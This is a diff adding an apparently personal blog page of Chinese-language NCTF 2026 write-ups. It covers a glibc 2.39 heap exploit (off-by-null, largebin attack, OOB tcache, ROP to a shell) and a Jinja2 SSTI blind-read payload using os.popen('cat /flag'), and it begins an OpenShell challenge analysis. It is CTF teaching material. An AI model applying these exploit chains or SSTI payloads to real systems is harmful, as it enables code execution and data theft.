@@ -1,0 +1,1352 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="NCTF ?? write up ?????">
+    <title>NCTF???? | suancai_soup</title>
+    <link rel="stylesheet" href="../assets/css/styles.css">
+  </head>
+  <body>
+    <header class="site-header">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SS</span>
+        <span><strong>suancai_soup</strong><small>Security & Notes</small></span>
+      </a>
+      <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="site-nav"><span></span><span></span><span></span></button>
+      <nav class="site-nav" id="site-nav"><a href="../index.html">??</a><a href="../archive.html">??</a><a href="../about.html">??</a><a href="../rss.xml">RSS</a></nav>
+    </header>
+
+    <main class="article-shell">
+      <article class="article">
+        <header class="article-header">
+          <div class="post-meta"><span>NCTF????</span><time datetime="2026-05-07">2026-05-07 ? 28,989 chars ? 32 mins.</time></div>
+          <h1>NCTF????</h1>
+          <p>????? <code>E:\ctf\NCTF</code> ?????? write up ? Markdown ??????????????????? payload??????????????????????????</p>
+        </header>
+
+        <div class="article-toc">
+          <a href="#ezheap-wp">ezheap WP</a>
+          <a href="#horse">HORSE</a>
+          <a href="#nctf-2026-openshell-writeup">NCTF 2026 OpenShell Writeup</a>
+          <a href="#what-another-mess-wp">What another mess! WP</a>
+          <a href="#server-47768-wp">server 47768 WP</a>
+          <a href="#鸡爪流高手-wp">鸡爪流高手 WP</a>
+        </div>
+
+        <section>
+          <h2>????</h2>
+          <ul>
+            <li>ezheap WP?<code>ezheap_wp.md</code></li>
+            <li>HORSE?<code>WP_horse.md</code></li>
+            <li>NCTF 2026 OpenShell Writeup?<code>WP_OpenShell.md</code></li>
+            <li>What another mess! WP?<code>What_another_mess_wp.md</code></li>
+            <li>server 47768 WP?<code>wp_47768.md</code></li>
+            <li>鸡爪流高手 WP?<code>鸡爪流高手-WP.md</code></li>
+          </ul>
+        </section>
+
+        <section class="wp-section">
+          <h2 id="ezheap-wp">ezheap WP</h2>
+<h2 id="ezheap-wp-2">ezheap WP</h2>
+<h3 id="题目信息">题目信息</h3>
+<ul>
+<li>题目名：<code>ezheap</code></li>
+<li>附件：<code>pwn</code>、<code>libc.so.6</code></li>
+<li>架构：<code>amd64</code></li>
+<li>保护：<code>Full RELRO</code>、<code>Canary</code>、<code>NX</code>、<code>PIE</code>、<code>SHSTK</code>、<code>IBT</code></li>
+<li>glibc：附件自带 <code>libc.so.6</code>，版本为 <code>2.39</code></li>
+</ul>
+<p>本题的核心是一个典型的 <code>off-by-null</code>，但最终利用并不是传统的“直接重叠后改 __free_hook”，而是：</p>
+<ol>
+<li>先通过 <code>show</code> 拿到 <code>libc</code> 和 <code>heap</code> 泄露</li>
+<li>用 <code>off-by-null + backward consolidation</code> 做出重叠</li>
+<li>借助一次 <code>largebin attack</code> 改写 <code>mp_.tcache_bins</code></li>
+<li>利用 glibc 2.39 上被放大的 <code>tcache</code> OOB 行为，完成三次“任意地址分配”</li>
+<li>先泄 <code>stack</code>，再泄 <code>PIE</code>，再伪造 <code>chunks/sizes</code></li>
+<li>最后通过伪造出的 chunk 索引，直接把 <code>edit_chunk</code> 的保存现场改成 ROP，起 <code>/bin/sh</code></li>
+</ol>
+<p>远程最终拿到的 flag 为：</p>
+<pre><code>nctf{c6d45d25-0a89752cefb8e5d-21e2f9bd9}</code></pre>
+<hr>
+<h3 id="程序功能分析">程序功能分析</h3>
+<p>程序提供 4 个菜单功能：</p>
+<ol>
+<li><code>add</code></li>
+<li><code>edit</code></li>
+<li><code>delete</code></li>
+<li><code>show</code></li>
+</ol>
+<p>索引范围是 <code>0..31</code>，chunk size 限制在：</p>
+<pre><code>0x450 &lt;= size &lt;= 0x550</code></pre>
+<p>对应反汇编里 <code>add_chunk</code> 的判定如下：</p>
+<pre><code>cmp [size], 0x44f
+jle invalid
+cmp [size], 0x550
+jle ok</code></pre>
+<p>这意味着本题所有 chunk 都是偏大的 chunk，正常情况下不会进默认的 <code>tcache</code> 范围。</p>
+<h4 id="关键漏洞点-edit-的-off-by-null">关键漏洞点：edit 的 off-by-null</h4>
+<p><code>edit_chunk</code> 的关键逻辑是：</p>
+<pre><code>read(0, chunk, size)
+chunk[read_len] = 0</code></pre>
+<p>对应反汇编：</p>
+<pre><code>15f0: call read@plt
+15f5: add rax, rbx
+15f8: mov BYTE PTR [rax], 0x0</code></pre>
+<p>如果 <code>read_len == size</code>，那么最后这个 <code>chunk[read_len] = 0</code> 就会向后多写一个字节。</p>
+<p>这正是本题的唯一核心漏洞。</p>
+<hr>
+<h3 id="漏洞利用总览">漏洞利用总览</h3>
+<p>整条利用链可以概括为：</p>
+<pre><code>show 泄露 libc/heap
+    -&gt;
+off-by-null 改 next chunk size，触发 backward consolidation
+    -&gt;
+拿到 overlap
+    -&gt;
+largebin attack 改 mp_.tcache_bins
+    -&gt;
+free 0x500 chunk 时进入 OOB tcache entry
+    -&gt;
+三次任意地址分配：
+    1. 泄 stack
+    2. 泄 PIE
+    3. 分配到 .bss，伪造 chunks/sizes
+    -&gt;
+伪造 idx17 指向栈
+    -&gt;
+edit(17) 改 saved rbp/saved rip
+    -&gt;
+ROP -&gt; system(&quot;/bin/sh&quot;)</code></pre>
+<p>本题最绕的地方不在 <code>off-by-null</code> 本身，而在 glibc 2.39 里如何把一次 largebin attack 转成后续稳定的任意地址分配。</p>
+<hr>
+<h3 id="第一步-泄露-libc-和-heap">第一步：泄露 libc 和 heap</h3>
+<p>先做如下堆布局：</p>
+<pre><code>add(20, 0x450)
+add(21, 0x450)
+add(22, 0x550)
+add(23, 0x550)
+
+delete(22)
+delete(20)
+delete(21)
+
+add(24, 0x550)
+add(25, 0x450)
+leak = show(25)</code></pre>
+<p>这里利用的是 unsorted bin / large chunk 释放后的残留指针，通过 <code>show(25)</code> 可以同时看到：</p>
+<ul>
+<li><code>libc</code> 指针</li>
+<li><code>heap</code> 指针</li>
+</ul>
+<p>在本题中偏移稳定为：</p>
+<pre><code>libc.address = u64(leak[:8]) - 0x204040
+heap_leak = u64(leak[0x10:0x18])
+fake_chunk = heap_leak + 0xE40</code></pre>
+<p>这里 <code>fake_chunk</code> 是后面伪造 backward consolidation 用的假 chunk 头位置。</p>
+<hr>
+<h3 id="第二步-off-by-null-触发-backward-consolidation-制造-overlap">第二步：off-by-null 触发 backward consolidation，制造 overlap</h3>
+<p>申请 4 个连续的 <code>0x4f8</code>：</p>
+<pre><code>add(0, 0x4f8)
+add(1, 0x4f8)
+add(2, 0x4f8)
+add(3, 0x4f8)</code></pre>
+<p>然后构造两个关键写入。</p>
+<h4 id="1-edit-0-在-chunk0-末尾附近布置-fake-chunk-header">1. edit(0)：在 chunk0 末尾附近布置 fake chunk header</h4>
+<pre><code>payload0  = b&quot;A&quot; * 0x10
+payload0 += p64(0)
+payload0 += p64(0x9e1)
+payload0 += p64(fake_chunk) * 4
+payload0  = payload0.ljust(0x4f0, b&quot;A&quot;)
+edit(0, payload0)</code></pre>
+<p>这里相当于在后方准备一个“看起来像合法 free chunk”的头。</p>
+<h4 id="2-edit-1-写满整个-chunk1-触发一字节越界清零">2. edit(1)：写满整个 chunk1，触发一字节越界清零</h4>
+<pre><code>edit(1, b&quot;B&quot; * 0x4f0 + p64(0x9e0))</code></pre>
+<p><code>size == 0x4f8</code>，所以当 <code>read()</code> 读满时：</p>
+<ul>
+<li>最后 8 个字节会覆盖到下一个 chunk 的 <code>prev_size</code></li>
+<li>额外的 <code>\x00</code> 会把下一个 chunk 的 <code>size</code> 最低字节清零</li>
+</ul>
+<p>这样在 <code>free(chunk2)</code> 时，glibc 会错误地认为前一个 chunk 是 free 的，于是发生 backward consolidation。</p>
+<h4 id="3-free-malloc-拿-overlap">3. free + malloc 拿 overlap</h4>
+<pre><code>delete(2)
+add(4, 0x550)</code></pre>
+<p>这时 <code>idx4</code> 就会从合并后的大块中切出来，并和 <code>idx1</code> 形成重叠。</p>
+<p>验证方式：</p>
+<pre><code>marker = b&quot;Z&quot; * 0x120 + b&quot;Y&quot; * (0x550 - 0x120)
+edit(4, marker)
+leak = show(1)</code></pre>
+<p>如果 <code>show(1)</code> 前段能看到大量 <code>Y</code>，说明 overlap 已成立。</p>
+<hr>
+<h3 id="第三步-借-overlap-做一次-largebin-attack">第三步：借 overlap 做一次 largebin attack</h3>
+<p>本题真正的关键点在这里。</p>
+<p>由于默认 <code>tcache</code> 最多只覆盖到 <code>0x408</code> 左右，而我们的 chunk 都在 <code>0x500</code> 左右，必须先修改 glibc 的 <code>malloc_par</code> 参数，才能把大 chunk 引导进 tcache 相关逻辑。</p>
+<p>最终稳定做法是只打一发：</p>
+<pre><code>mp_.tcache_bins</code></pre>
+<p>其地址为：</p>
+<pre><code>libc.address + 0x2031e8</code></pre>
+<h4 id="堆布局">堆布局</h4>
+<pre><code>add(5, 0x510)
+add(6, 0x450)
+add(8, 0x508)
+add(9, 0x550)
+add(10, 0x4f8)</code></pre>
+<p>然后：</p>
+<pre><code>delete(5)
+add(7, 0x550)
+delete(8)</code></pre>
+<p>含义如下：</p>
+<ul>
+<li><code>idx5</code> 对应的实际 chunk size 是 <code>0x520</code>，先进入 unsorted，再被下一次 <code>malloc</code> 推到 largebin</li>
+<li><code>idx8</code> 对应实际 chunk size 是 <code>0x510</code>，留在 unsorted，作为 largebin attack 的“插入触发器”</li>
+</ul>
+<h4 id="修改-largebin-chunk-的-bk-nextsize">修改 largebin chunk 的 <code>bk_nextsize</code></h4>
+<p>由于 <code>idx4</code> 和 <code>idx1</code> 重叠，<code>show(1)</code> 能读到 largebin chunk 的头。实践中：</p>
+<ul>
+<li>largebin chunk 头在 <code>show(1)</code> 数据里的偏移是 <code>0x70</code></li>
+<li><code>bk_nextsize</code> 偏移在 <code>0x70 + 0x28</code></li>
+</ul>
+<p>于是只改这一项：</p>
+<pre><code>cur = bytearray(show(1))
+cur[0x70 + 0x28 : 0x70 + 0x30] = p64(libc.address + 0x2031e8 - 0x20)
+edit(1, bytes(cur))</code></pre>
+<p>注意必须“只改 8 字节”，不能把整片 largebin header 用垃圾数据覆盖掉，否则 attack 会直接失效。</p>
+<h4 id="触发-largebin-attack">触发 largebin attack</h4>
+<pre><code>add(12, 0x550)</code></pre>
+<p>这样就能把：</p>
+<pre><code>mp_.tcache_bins</code></pre>
+<p>改写成堆地址，从而影响后续大 chunk free 时的 tcache 下标访问。</p>
+<hr>
+<h3 id="第四步-glbic-2-39-上的-oob-tcache-行为">第四步：glbic 2.39 上的 OOB tcache 行为</h3>
+<p>这一段是整题的核心利用技巧。</p>
+<p>在 glibc 2.39 中，本题这条链最终不是把大 chunk 正常塞进传统 tcache，而是通过改坏 <code>mp_.tcache_bins</code>，让 <code>0x500</code> 附近大小的 chunk 在 free 时访问到 <strong>越界的 tcache entry</strong>。</p>
+<p>实际观察后可以发现：</p>
+<ul>
+<li>对应 <code>0x4f8</code> 请求大小的 tcache index 会落到一个 OOB 槽位</li>
+<li>这个 OOB 槽位实际映射到了某个可控堆块用户区中</li>
+<li>在本题布局下，这个槽位稳定落在 <code>idx24</code> 用户区偏移 <code>0x60</code></li>
+</ul>
+<p>所以后续就可以这样玩：</p>
+<ol>
+<li>free 某个 <code>0x4f8</code> chunk，让它成为 OOB tcache bin 的头指针</li>
+<li>通过 <code>edit(24)</code> 改 <code>idx24+0x60</code>，等价于改这个 bin 的 head</li>
+<li>再次 <code>malloc(0x4f8)</code>，就能拿到“任意地址分配”</li>
+</ol>
+<p>脚本里把这个过程封装成：</p>
+<pre><code>def poison_oob_tcache(io, fill_idx, patch24, target):
+    delete_sync(io, fill_idx)
+    patch24 = bytearray(patch24)
+    patch24[0x60:0x68] = p64(target)
+    edit(io, 24, bytes(patch24[:0x68]))</code></pre>
+<p>其中：</p>
+<ul>
+<li><code>fill_idx</code> 是拿来 free 进去填充这个 OOB tcache 的 <code>0x4f8</code> chunk</li>
+<li><code>target</code> 是下一次想让 <code>malloc(0x4f8)</code> 返回的地址</li>
+</ul>
+<hr>
+<h3 id="第五步-第一次任意分配-泄露-stack">第五步：第一次任意分配，泄露 stack</h3>
+<p>第一次把 OOB tcache 的返回地址指向：</p>
+<pre><code>libc.sym.environ - 0x18</code></pre>
+<p>利用流程：</p>
+<pre><code>poison_oob_tcache(io, 3, chunk24_view, libc.sym.environ - 0x18)
+add(io, 13, 0x4f8)
+stack_view = show(io, 13)
+stack_leak = u64(stack_view[0x18:0x20])</code></pre>
+<p>为什么是 <code>-0x18</code>？</p>
+<p>因为 <code>show</code> 读一整块用户区，把目标地址附近一段内存原样打印出来。通过本地和远端调试可以看到：</p>
+<ul>
+<li><code>environ</code> 附近真正有用的栈指针正好落在这段窗口中的 <code>0x18</code></li>
+</ul>
+<p>于是得到稳定的：</p>
+<pre><code>stack_leak</code></pre>
+<hr>
+<h3 id="第六步-第二次任意分配-泄露-pie">第六步：第二次任意分配，泄露 PIE</h3>
+<p>有了一个栈地址之后，还不够，因为程序是 PIE，后面要改 <code>.bss</code> 就必须知道二进制基址。</p>
+<p>于是第二次任意分配不直接写栈，而是先把一个 chunk 分配到更低的一段栈窗口：</p>
+<pre><code>pie_target = (stack_leak - 0x300) &amp; ~0xF
+poison_oob_tcache(io, 0, chunk24_view, pie_target)
+add(io, 14, 0x4f8)
+pie_view = show(io, 14)</code></pre>
+<p>然后在 <code>pie_view</code> 里扫描返回地址。</p>
+<p>实践中，这个更低的栈窗口里会稳定出现这些代码地址：</p>
+<ul>
+<li><code>main</code> 附近</li>
+<li><code>_start</code> 附近</li>
+<li><code>read_long/read_line</code> 附近</li>
+</ul>
+<p>对应脚本里的已知偏移表：</p>
+<pre><code>candidates = [0x1842, 0x1160, 0x1185, 0x13f4, 0x12e3, 0x16BB, 0x18A5]</code></pre>
+<p>扫描逻辑：</p>
+<pre><code>def recover_pie(stack_window):
+    for off in range(0, len(stack_window) - 8, 8):
+        qword = u64(stack_window[off : off + 8])
+        for code_off in candidates:
+            base = qword - code_off
+            if base &amp; 0xFFF == 0 and 0x550000000000 &lt;= base &lt; 0x700000000000:
+                return base</code></pre>
+<p>最后恢复：</p>
+<pre><code>elf.address = recover_pie(pie_view)</code></pre>
+<hr>
+<h3 id="第七步-第三次任意分配-落到-bss-伪造-chunks-sizes">第七步：第三次任意分配，落到 .bss 伪造 <code>chunks/sizes</code></h3>
+<p>前两次任意分配都是为了“读地址”。最后一次才是实际控制流利用。</p>
+<p>程序的 <code>.bss</code> 上有两个全局数组：</p>
+<pre><code>chunks[32];
+sizes[32];</code></pre>
+<p>地址分别在：</p>
+<ul>
+<li><code>chunks</code>：<code>elf.address + 0x4060</code></li>
+<li><code>sizes</code>：<code>elf.address + 0x4160</code></li>
+</ul>
+<p>脚本最终选择把任意分配放到：</p>
+<pre><code>bss_target = elf.address + 0x40D0  # chunks[14]</code></pre>
+<p>然后：</p>
+<pre><code>poison_oob_tcache(io, 10, chunk24_view, bss_target)
+add(io, 16, 0x4f8)</code></pre>
+<p>此时 <code>idx16</code> 实际已经不是普通堆块，而是落在 <code>.bss</code> 上的一块“伪 chunk”。</p>
+<h4 id="伪造一个新的索引-17">伪造一个新的索引 <code>17</code></h4>
+<p>我们希望后续 <code>edit(17)</code> 时：</p>
+<ul>
+<li><code>chunks[17]</code> 指向栈上的某个关键位置</li>
+<li><code>sizes[17]</code> 给一个足够大的可写长度</li>
+</ul>
+<p>通过调试可知，在最终执行 <code>edit(17)</code> 时，想要命中的位置是：</p>
+<pre><code>stack_target = stack_leak - 0x158</code></pre>
+<p>这对应 <code>edit_chunk</code> 保存的 <code>rbp/rip</code> 区域。</p>
+<p>于是写 <code>.bss</code>：</p>
+<pre><code>bss_payload = bytearray(b&quot;B&quot; * 0x120)
+bss_payload[0x18:0x20] = p64(stack_target)  # chunks[17]
+bss_payload[0x118:0x120] = p64(0x4F8)       # sizes[17]
+edit(io, 16, bytes(bss_payload))</code></pre>
+<p>为什么是这两个偏移？</p>
+<p>因为 <code>idx16</code> 这块伪 chunk 正好覆盖了：</p>
+<ul>
+<li><code>chunks[17]</code></li>
+<li><code>sizes[17]</code></li>
+</ul>
+<p>对应关系通过 <code>.bss</code> 相对布局可以直接算出。</p>
+<p>至此，程序层面上已经等价于：</p>
+<pre><code>chunks[17] = stack_target;
+sizes[17] = 0x4f8;</code></pre>
+<hr>
+<h3 id="第八步-edit-17-直接改-saved-rbp-saved-rip">第八步：<code>edit(17)</code> 直接改 saved rbp / saved rip</h3>
+<p>现在调用：</p>
+<pre><code>edit(io, 17, chain)</code></pre>
+<p>就不再是在写普通 heap，而是在写：</p>
+<pre><code>edit_chunk 自己栈上的保存现场</code></pre>
+<p>最终 ROP 很简单：</p>
+<pre><code>rop = ROP(libc)
+pop_rdi = rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;]).address
+ret = rop.find_gadget([&quot;ret&quot;]).address
+bin_sh = next(libc.search(b&quot;/bin/sh\x00&quot;))
+
+fake_rbp = stack_target + 0x200
+chain = flat(
+    fake_rbp,
+    ret,
+    pop_rdi,
+    bin_sh,
+    libc.sym.system,
+)</code></pre>
+<p>写进去之后，<code>edit_chunk</code> 返回时直接跳到：</p>
+<pre><code>system(&quot;/bin/sh&quot;)</code></pre>
+<p>随后发命令即可：</p>
+<pre><code>io.sendline(b&quot;echo PWNED; id; /bin/echo MARK&quot;)</code></pre>
+<hr>
+<h3 id="为什么这题能直接改返回地址">为什么这题能直接改返回地址</h3>
+<p><code>checksec</code> 会显示：</p>
+<ul>
+<li><code>SHSTK</code></li>
+<li><code>IBT</code></li>
+</ul>
+<p>但实际利用里，直接改 <code>edit_chunk</code> 的保存返回地址仍然可以成功拿 shell。</p>
+<p>这说明至少在本题本地/远端运行环境里：</p>
+<ul>
+<li>虽然 binary 带有相关属性</li>
+<li>但最终没有形成会阻止这条链的有效运行时约束</li>
+</ul>
+<p>实战里不应该被 <code>checksec</code> 结果吓住，还是要以真实可利用行为为准。</p>
+<hr>
+<h3 id="关键偏移总结">关键偏移总结</h3>
+<h4 id="libc-heap">libc / heap</h4>
+<pre><code>libc.address = u64(leak[:8]) - 0x204040
+heap_leak    = u64(leak[0x10:0x18])
+fake_chunk   = heap_leak + 0xE40</code></pre>
+<h4 id="malloc-par">malloc_par</h4>
+<pre><code>mp_.tcache_bins = libc.address + 0x2031e8</code></pre>
+<h4 id="overlap-中-largebin-chunk-头在-show-1-内的位置">overlap 中 largebin chunk 头在 show(1) 内的位置</h4>
+<pre><code>header_off = 0x70
+bk_nextsize_off = 0x70 + 0x28</code></pre>
+<h4 id="oob-tcache-控制位置">OOB tcache 控制位置</h4>
+<pre><code>idx24 + 0x60</code></pre>
+<h4 id="三次任意分配目标">三次任意分配目标</h4>
+<pre><code>1) libc.sym.environ - 0x18
+2) (stack_leak - 0x300) &amp; ~0xF
+3) elf.address + 0x40D0</code></pre>
+<h4 id="最终栈目标">最终栈目标</h4>
+<pre><code>stack_target = stack_leak - 0x158</code></pre>
+<hr>
+<h3 id="利用脚本">利用脚本</h3>
+<p>完整利用脚本见：</p>
+<ul>
+<li><span>exp.py</span> <code>E:/ctf/NCTF/ezheap/attachment.bak/exp.py</code></li>
+</ul>
+<p>本地运行：</p>
+<pre><code>python3 exp.py</code></pre>
+<p>远程运行：</p>
+<pre><code>python3 exp.py REMOTE HOST=114.66.24.221 PORT=32378</code></pre>
+<p>脚本已支持：</p>
+<ul>
+<li>本地 <code>LD_PRELOAD</code></li>
+<li>远程模式</li>
+<li>远程连接自动重试</li>
+</ul>
+<hr>
+<h3 id="远程验证">远程验证</h3>
+<p>远程成功起 shell 后，执行：</p>
+<pre><code>ls -l /
+cat /flag</code></pre>
+<p>得到：</p>
+<pre><code>nctf{c6d45d25-0a89752cefb8e5d-21e2f9bd9}</code></pre>
+<hr>
+<h3 id="这题的几个关键点">这题的几个关键点</h3>
+<h4 id="1-真正的漏洞只是一个字节">1. 真正的漏洞只是一个字节</h4>
+<p>本题所有复杂利用，根源都只是：</p>
+<pre><code>read 满后多写 1 字节 0</code></pre>
+<p>但由于 chunk size 恰好都在 <code>0x500</code> 附近，这个一字节正好足够打出 backward consolidation。</p>
+<h4 id="2-第一发-largebin-attack-不要-整块乱写">2. 第一发 largebin attack 不要“整块乱写”</h4>
+<p>实践中最容易翻车的是：</p>
+<pre><code>直接用一整块新数据去 edit(1)</code></pre>
+<p>这样会把 overlapped 的 largebin chunk 头一起破坏掉，导致 attack 失效。</p>
+<p>正确做法是：</p>
+<pre><code>cur = bytearray(show(1))
+只修改 bk_nextsize 的 8 字节</code></pre>
+<h4 id="3-glibc-2-39-下的利用重点不是老式-hook">3. glibc 2.39 下的利用重点不是老式 hook</h4>
+<p>本题不需要走：</p>
+<ul>
+<li><code>__free_hook</code></li>
+<li><code>__malloc_hook</code></li>
+</ul>
+<p>真正稳定的路径是：</p>
+<pre><code>一次 largebin attack
+    -&gt;
+放大 tcache 行为
+    -&gt;
+OOB tcache entry
+    -&gt;
+任意地址分配</code></pre>
+<h4 id="4-最终不要急着直接把-chunk-分配到栈上改返回">4. 最终不要急着直接把 chunk 分配到栈上改返回</h4>
+<p>直接把第二次任意分配放到活跃栈帧上，容易让 <code>malloc/add</code> 自己先崩。</p>
+<p>更稳的链是：</p>
+<pre><code>先读 stack
+再读 PIE
+再把 chunk 放到 .bss
+伪造一个新的 idx
+最后用这个 idx 去写栈</code></pre>
+<p>这也是本题 exploit 最终稳定下来的关键。</p>
+<hr>
+<h3 id="结论">结论</h3>
+<p>这题表面是 <code>ezheap</code>，但实际上是一个比较完整的现代 glibc 2.39 堆利用题：</p>
+<ul>
+<li>起手是 <code>off-by-null</code></li>
+<li>中间是 <code>backward consolidation</code></li>
+<li>核心转折点是 <code>largebin attack</code></li>
+<li>后段利用的是 <code>tcache</code> 越界控制</li>
+<li>最后再配合 <code>.bss</code> 伪造索引，把任意地址写转换成稳定控制流劫持</li>
+</ul>
+<p>从利用体验上说，这题最值钱的部分不是“怎么打一字节越界”，而是：</p>
+<pre><code>怎么把一次 overlap 过渡成稳定、可复现、适配本地和远端的完整 exploit</code></pre>
+<p>这个版本的 <code>exp.py</code> 已经可以完整复现这条链。</p>
+        </section>
+
+        <section class="wp-section">
+          <h2 id="horse">HORSE</h2>
+<p>Flag:</p>
+<pre><code>NCTF{af811a863975_W3lcOMe_TO_n(7f}</code></pre>
+<h3 id="题目现象">题目现象</h3>
+<p>访问首页是一个登录页：</p>
+<ul>
+<li>只有 <code>GET /</code></li>
+<li>参数是 <code>username</code> 和 <code>password</code></li>
+<li><code>username</code> 会被直接回显到 <code>Welcome: ...</code></li>
+<li><code>password</code> 只用于判空</li>
+</ul>
+<p>测试：</p>
+<pre><code>/?username=admin&amp;password=1</code></pre>
+<p>页面会显示：</p>
+<pre><code>Welcome: admin</code></pre>
+<p>同时还可以发现一个异常点：</p>
+<ul>
+<li><code>{{7*7}}</code> 正常回显，不会计算</li>
+<li>但 <code>{{1/0}}</code> 会触发 <code>500</code></li>
+<li><code>{{1/1}}</code> 又是正常 <code>200</code></li>
+</ul>
+<p>这说明这里不是普通的反射 XSS 终点，后端对 <code>username</code> 还存在一条“会求值表达式并在出错时 500”的逻辑，可以当作盲注 oracle 用。</p>
+<h3 id="利用思路">利用思路</h3>
+<p>目标是把 <code>username</code> 构造成 Jinja2 表达式，用“是否报错”作为真假通道。</p>
+<p>先确认 Flask/Jinja 上下文对象可用：</p>
+<pre><code>{{1/(request is not none)}}
+{{1/(config is not none)}}
+{{1/(url_for is not none)}}</code></pre>
+<p>这些请求返回 <code>200</code>，说明表达式被执行了。</p>
+<p>然后拿到 <code>os</code>：</p>
+<pre><code>{{1/(&#x27;os&#x27; in url_for.__globals__)}}</code></pre>
+<p>返回 <code>200</code>，说明可以从 <code>url_for.__globals__</code> 进入 Python 全局变量。</p>
+<p>接着确认 <code>/flag</code> 存在：</p>
+<pre><code>{{1/(url_for.__globals__[&#x27;os&#x27;].path.exists(&#x27;/flag&#x27;))}}</code></pre>
+<p>返回 <code>200</code>。</p>
+<p>最后把读文件结果变成布尔判断：</p>
+<pre><code>{{1/(url_for.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read().startswith(&#x27;NCTF{&#x27;))}}</code></pre>
+<p>如果前缀正确，请求返回 <code>200</code>；如果前缀错误，表达式变成 <code>1/False</code>，触发除零，返回 <code>500</code>。</p>
+<p>这样就能逐字符盲读 <code>/flag</code>。</p>
+<h3 id="手工验证">手工验证</h3>
+<p>例如：</p>
+<pre><code>{{1/(url_for.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read().startswith(&#x27;NCTF{65&#x27;))}}</code></pre>
+<p>返回 <code>200</code>，说明 flag 前缀是：</p>
+<pre><code>NCTF{65</code></pre>
+<p>继续枚举即可。</p>
+<h3 id="自动化脚本">自动化脚本</h3>
+<p>题目目录下写了自动盲读脚本：</p>
+<p><span>ssti_flag_reader.py</span> <code>/mnt/e/Desktop/nctf/web/n-horse/ssti_flag_reader.py</code></p>
+<p>用法：</p>
+<pre><code>python3 /mnt/e/Desktop/nctf/web/n-horse/ssti_flag_reader.py \
+  --url http://114.66.24.221:42251/ \
+  --prefix &#x27;NCTF{&#x27;</code></pre>
+<p>也支持断点续跑，例如：</p>
+<pre><code>python3 /mnt/e/Desktop/nctf/web/n-horse/ssti_flag_reader.py \
+  --url http://114.66.24.221:42251/ \
+  --prefix &#x27;NCTF{655033259c07_We!&#x27;</code></pre>
+<p>脚本核心逻辑：</p>
+<ol>
+<li>构造表达式 <code>{{1/(cat /flag 的结果.startswith(prefix))}}</code></li>
+<li>返回 <code>200</code> 说明前缀正确</li>
+<li>返回 <code>500</code> 说明前缀错误</li>
+<li>逐字符扩展直到读到 <code>}</code></li>
+</ol>
+<h3 id="最终-payload-核心">最终 payload 核心</h3>
+<p>盲读核心表达式：</p>
+<pre><code>{{1/(url_for.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read().startswith(&#x27;NCTF{...&#x27;))}}</code></pre>
+<p>利用点本质是：</p>
+<ul>
+<li><code>username</code> 进入了一个会执行表达式的模板上下文</li>
+<li><code>url_for.__globals__</code> 可达 <code>os</code></li>
+<li>可通过 <code>os.popen(&#x27;cat /flag&#x27;).read()</code> 读取 flag</li>
+<li>用除零异常把结果转成布尔 oracle</li>
+</ul>
+<h3 id="备注">备注</h3>
+<p>这题表面上最显眼的是反射型 XSS，但真正稳定拿 flag 的方向是服务端模板表达式盲注。</p>
+        </section>
+
+        <section class="wp-section">
+          <h2 id="nctf-2026-openshell-writeup">NCTF 2026 OpenShell Writeup</h2>
+<h2 id="nctf-2026-openshell-writeup-2">NCTF 2026 OpenShell Writeup</h2>
+<h3 id="题目信息-2">题目信息</h3>
+<ul>
+<li>题目：<code>OpenShell</code></li>
+<li>类型：<code>Web</code></li>
+<li>平台：<code>GZCTF DynamicContainer</code></li>
+<li>最终通过提交的动态 flag：</li>
+</ul>
+<pre><code>flag{45bf5920-d096-4e78-bb69-c9a14c9e7b17}</code></pre>
+<hr>
+<h3 id="一-题目本体分析">一、题目本体分析</h3>
+<p>附件很小，核心文件只有三个：</p>
+<ul>
+<li><code>OpenShell/app/bot.js</code></li>
+<li><code>OpenShell/entrypoint.sh</code></li>
+<li><code>OpenShell/Dockerfile</code></li>
+</ul>
+<h4 id="1-flag-的落点">1. flag 的落点</h4>
+<p><code>OpenShell/entrypoint.sh</code>：</p>
+<pre><code>echo $GZCTF_FLAG &gt; /flag
+unset GZCTF_FLAG
+
+chown node:node /flag
+chmod 000 /flag</code></pre>
+<p>这几行说明了几件事：</p>
+<ol>
+<li>动态 flag 会由平台注入为环境变量 <code>GZCTF_FLAG</code></li>
+<li>容器启动时把 flag 写入 <code>/flag</code></li>
+<li>随后 <code>unset GZCTF_FLAG</code>，所以不能指望后续再从环境变量里直接拿</li>
+<li><code>/flag</code> 被改成 <code>000</code>，正常情况下即使 RCE 了，也未必能直接读</li>
+</ol>
+<p>所以如果走“业务预期解”，大概率是想办法借助 <code>opencode web</code> 的本地能力来读文件。</p>
+<h4 id="2-bot-的访问模型">2. bot 的访问模型</h4>
+<p><code>OpenShell/app/bot.js</code>：</p>
+<pre><code>await page.goto(url, { waitUntil: &quot;domcontentloaded&quot;, timeout: 15_000 });
+await page.waitForTimeout(15_000);</code></pre>
+<p>以及：</p>
+<pre><code>if (!parsed.hostname.endsWith(&#x27;.pages.dev&#x27;)) {
+    return res.status(400).json({
+        ok: false,
+        error: &quot;invalid url&quot;,
+    });
+}</code></pre>
+<p>结论：</p>
+<ol>
+<li>bot 只访问 <code>http/https</code></li>
+<li>hostname 必须以 <code>.pages.dev</code> 结尾</li>
+<li>页面加载后会停留约 15 秒</li>
+</ol>
+<p>这意味着典型思路是：</p>
+<ul>
+<li>找一个可控的 <code>pages.dev</code> 页面</li>
+<li>让 bot 打开</li>
+<li>在 bot 里执行 JS</li>
+<li>再想办法访问容器里的本地服务</li>
+</ul>
+<h4 id="3-opencode-本地服务">3. OpenCode 本地服务</h4>
+<p><code>entrypoint.sh</code> 还会启动：</p>
+<pre><code>su - node -c &#x27;nohup opencode web &gt;/tmp/opencode-web.log 2&gt;&amp;1 &amp;&#x27;</code></pre>
+<p>它默认监听在本地 <code>127.0.0.1:4096</code>。继续对本地还原和源码分析后，可以确认几个关键点：</p>
+<ul>
+<li>前端路由在 <code>tmp/opencode-src/packages/app/src/app.tsx</code></li>
+<li>路由形态是 <code>/:dir/session/:id?</code></li>
+<li>默认在 <code>opencode.ai</code> 域下会把 API 指到 <code>http://localhost:4096</code>，见 <code>tmp/opencode-src/packages/app/src/entry.tsx</code></li>
